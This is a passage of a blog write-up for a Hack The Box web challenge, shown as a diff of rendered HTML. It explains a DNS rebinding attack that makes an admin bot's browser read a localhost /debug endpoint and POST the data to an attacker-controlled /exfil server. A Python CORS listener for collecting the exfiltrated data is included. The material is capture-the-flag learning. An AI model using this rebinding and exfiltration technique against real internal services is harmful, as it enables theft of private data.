+</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;input[name=pass]&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>pass</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;button[type=submit]&#34;</span><span class=p>).</span><span class=nx>click</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=s2>&#34;The Overseer&#34;</span><span class=p>,</span> <span class=nx>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>waitForNavigation</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>waitUntil</span><span class=o>:</span> <span class=s2>&#34;networkidle2&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>waitForTimeout</span><span class=p>(</span><span class=mi>7000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=nx>browser</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>finally</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>browser</span><span class=p>)</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><p>So the problem is that the client is making a request to <code>http://localhost/debug</code> from <code>http://attacker.com</code>, which gets blocked.
+But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for <code>http://attacker.com</code> to instead point to <code>127.0.0.1</code>?</p><ol><li>So the bot visits <code>http://attacker.com</code>, which will resolve to our real address (lets say it is <code>1.3.3.7</code>).</li><li>We rebind <code>http://attacker.com</code> to <code>127.0.0.1</code>, WHILE the bot still has the page loaded in their browser.</li><li>Then our script will run, and will send a request to <code>http://attacker.com/debug</code>, which is now actually <code>http://127.0.0.1/debug</code>, successfully grabbing the environment data that we need.</li><li>Then we make a post request to <code>http://1.3.3.7/exfil</code> containing the response to <code>http://attacker.com/debug</code> (actually <code>http://127.0.0.1/debug</code>), (and we set our CORS policy to allow requests from any domain), which successfully exfils the data to us.</li></ol><p>A key element to making this attack work is having a low TTL on the DNS response, so the browser is forced to ask for the address twice.</p><p>I decided to use this <a class=link href=https://lock.cmpxchg8b.com/rebinder.html target=_blank rel=noopener>dns rebind site</a> to facilitate the attack.
+The first address will be that of my EC2 instance, and the second will be <code>127.0.0.1</code>.
+Then we just need to run the attack a few times until we get the elements to line up properly.</p><p>However this attack kept failing.
+I would always receive both requests to my ec2 instance, no matter how many times I tried.
+I tried changing the delays, but never worked.
+At the end of this article I will explore why this was.</p><h3 id=bypass-2>Bypass 2</h3><p>In the same hacktricks article, a second subtype of dns rebinding was mentioned.
+Its very similar, but instead of depending on TTL to cause the browser to resolve the address, it will used availability of the server instead.
+We can use a service like AWS Route 53 to register 2 IP addresses for the same domain name, in our case it will be (<code>1.3.3.7</code> and <code>127.0.0.1</code>).
+For the first request to collect the CSRF payload, we allow the <code>1.3.3.7</code> ec2 instance to remain available, but once the page is loaded, we kill the instance.
+That way, when the next request is made to <code>http://attacker.com/debug</code> and it tries to make the request to our ec2 instance at <code>1.3.3.7</code>, the request will fail, and the victim&rsquo;s browser will fallback to <code>127.0.0.1</code>, allowing the attack to work.
+I will also set up a second ec2 instance to collect the post request, because I don&rsquo;t want to depend on the first ec2 instance booting up in time to catch the exfiltration POST request.
+In AWS this is called failover-routing.
+However, this requires registering a domain with AWS, which costs about 13$ depending on the name you chose, or 79$ to transfer in an existing domain.
+I tried to find a free alternative, but wasn&rsquo;t successful.
+Seems like at the minimum you need a domain, which I was able to get on Gandi for about 3$.
+Then I added in 2 DNS A records with the address of my ec2 instance and <code>0.0.0.0</code> as per the suggestion on HackTricks.</p><p><img src=/p/htb-insane-web-oopartdb/img/8.png width=993 height=114 srcset="/p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/8_huaf59b0db051cbccc042266550b267afd_5360_1024x0_resize_box_3.png 1024w" loading=lazy alt="2 DNS A records" class=gallery-image data-flex-grow=871 data-flex-basis=2090px></p><p>The min TTL is 300, but fortunately we won&rsquo;t depend on TTL for this attack, since we just depend on connectivity causing the browser to fallback to the alternative address (<code>0.0.0.0</code>).</p><p>AND THIS WORKED !!</p><p><img src=/p/htb-insane-web-oopartdb/img/9.png width=683 height=117 srcset="/p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/9_hu7d4752c376da2419cce15044c6d98500_7470_1024x0_resize_box_3.png 1024w" loading=lazy alt="Kill the server after the first request" class=gallery-image data-flex-grow=583 data-flex-basis=1401px> <img src=/p/htb-insane-web-oopartdb/img/10.png width=629 height=562 srcset="/p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/10_hu5fc19c9a5454334247fdaa9977a17e1b_15410_1024x0_resize_box_3.png 1024w" loading=lazy alt="Request to exfil contains our debug info" class=gallery-image data-flex-grow=111 data-flex-basis=268px></p><p>At this point just little automation for killing the payload server after the first request, and saving the post request for further examination:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>http.server</span> <span class=kn>import</span> <span class=n>HTTPServer</span><span class=p>,</span> <span class=n>SimpleHTTPRequestHandler</span><span class=p>,</span> <span class=n>test</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CORSRequestHandler</span><span class=p>(</span><span class=n>SimpleHTTPRequestHandler</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>end_headers</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s1>&#39;Access-Control-Allow-Origin&#39;</span><span class=p>,</span> <span class=s1>&#39;*&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>SimpleHTTPRequestHandler</span><span class=o>.</span><span class=n>end_headers</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>path</span> <span class=o>==</span> <span class=s1>&#39;/index.html&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>SimpleHTTPRequestHandler</span><span class=o>.</span><span class=n>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># Exit the program after serving the index.html file</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>SimpleHTTPRequestHandler</span><span class=o>.</span><span class=n>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>do_POST</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>content_length</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Content-Length&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=n>post_data</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>rfile</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>content_length</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>path</span> <span class=o>==</span> <span class=s1>&#39;/exfil&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;debug.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>post_data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Exfil data written to debug.txt&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>test</span><span class=p>(</span><span class=n>CORSRequestHandler</span><span class=p>,</span> <span class=n>HTTPServer</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/htb-insane-web-oopartdb/img/12.png width=820 height=650 srcset="/p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/12_hu95d6488530ee901344af53801fd2b1d7_80813_1024x0_resize_box_3.png 1024w" loading=lazy alt="Current attack structure" class=gallery-image data-flex-grow=126 data-flex-basis=302px></p><p><img src=/p/htb-insane-web-oopartdb/img/11.png width=683 height=184 srcset="/p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_480x0_resize_box_3.png 480w, /p/htb-insane-web-oopartdb/img/11_hueed3f851ca10f44d92646e6d96dbd821_11973_1024x0_resize_box_3.png 1024w" loading=lazy alt="Referral token acquired" class=gallery-image data-flex-grow=371 data-flex-basis=890px></p></section><footer class=article-footer><section class=article-tags><a href=/tags/web/>Web</a>
+<a href=/tags/htb/>Htb</a>
+<a href=/tags/insane/>Insane</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/when-leetcode-meets-hacking/><div class=article-image><img src=/p/when-leetcode-meets-hacking/img/hackthebox.a8564f6acab257e4e2c3fcbb7fce82b4_hud104239935165a44571788a9c3d01fba_34890_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post When Leetcode Meets Hacking" data-hash="md5-qFZPasqyV+Tiw/y7f86CtA=="></div><div class=article-details><h2 class=article-title>When Leetcode Meets Hacking</h2></div></a></article><article class=has-image><a href=/p/htb-web-prying-eyes/><div class=article-image><img src=/p/htb-web-prying-eyes/img/hackthebox.a8564f6acab257e4e2c3fcbb7fce82b4_hud104239935165a44571788a9c3d01fba_34890_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post HTB WEB Prying Eyes" data-hash="md5-qFZPasqyV+Tiw/y7f86CtA=="></div><div class=article-details><h2 class=article-title>HTB WEB Prying Eyes</h2></div></a></article><article class=has-image><a href=/p/kernel-adventures-part-ii/><div class=article-image><img src=https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg loading=lazy data-key data-hash=https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg></div><div class=article-details><h2 class=article-title>Kernel Adventures Part II</h2></div></a></article><article class=has-image><a href=/p/htb-pwn-pixel-audio/><div class=article-image><img src=/p/htb-pwn-pixel-audio/img/hackthebox.a8564f6acab257e4e2c3fcbb7fce82b4_hud104239935165a44571788a9c3d01fba_34890_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post HTB PWN Pixel Audio" data-hash="md5-qFZPasqyV+Tiw/y7f86CtA=="></div><div class=article-details><h2 class=article-title>HTB PWN Pixel Audio</h2></div></a></article><article class=has-image><a href=/p/htb-iterative-virus/><div class=article-image><img src=/p/htb-iterative-virus/img/hackthebox.a8564f6acab257e4e2c3fcbb7fce82b4_hud104239935165a44571788a9c3d01fba_34890_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post HTB Iterative Virus" data-hash="md5-qFZPasqyV+Tiw/y7f86CtA=="></div><div class=article-details><h2 class=article-title>HTB Iterative Virus</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//https-kvn11-github-io.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 Kvn11</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
